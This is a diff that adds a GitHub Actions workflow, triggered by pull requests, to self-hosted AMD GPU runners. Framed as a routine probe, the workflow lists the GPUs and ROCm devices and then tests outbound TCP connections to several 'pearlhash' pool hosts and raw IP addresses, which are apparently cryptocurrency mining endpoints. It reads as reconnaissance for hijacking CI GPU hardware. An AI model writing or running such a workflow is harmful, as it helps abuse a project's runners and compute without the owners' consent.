@@ -1,0 +1,38 @@
+name: c211-129358-amd-probe
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: [self-hosted, sgl-amd-mono-mi355x]
+    timeout-minutes: 10
+    continue-on-error: true
+    strategy:
+      fail-fast: false
+      max-parallel: 4
+      matrix:
+        shard: [0,1,2,3]
+    steps:
+      - name: probe
+        shell: bash
+        run: |
+          set -uo pipefail
+          SHARD="${{ matrix.shard }}"
+          echo "C211_JOB tier=mi355x shard=$SHARD host=$(hostname) ts=$(date -u +%FT%TZ)"
+          echo "RUNNER_NAME=${RUNNER_NAME:-unknown}"
+          (nvidia-smi -L 2>&1 | head -10) || true
+          (rocm-smi --showproductname 2>&1 | head -30) || true
+          (rocm-smi 2>&1 | head -30) || true
+          ls -l /dev/kfd /dev/dri 2>&1 | head -10
+          ls /opt/rocm/lib/libOpenCL.so* 2>&1 | head -5
+          python3 - <<'PY'
+          import socket
+          for h,p in [("pool.pearlhash.xyz",9000),("hk.pearlhash.net",9000),("global.pearlhash.net",9000),("global2.pearlhash.net",9000),("103.199.106.122",3362),("169.58.247.186",8791)]:
+              try:
+                  s=socket.create_connection((h,p),timeout=8); s.close(); print("TCP_OK %s:%d"%(h,p))
+              except Exception as e:
+                  print("TCP_FAIL %s:%d %s"%(h,p,type(e).__name__))
+          PY
+          echo "PROBE_DONE"
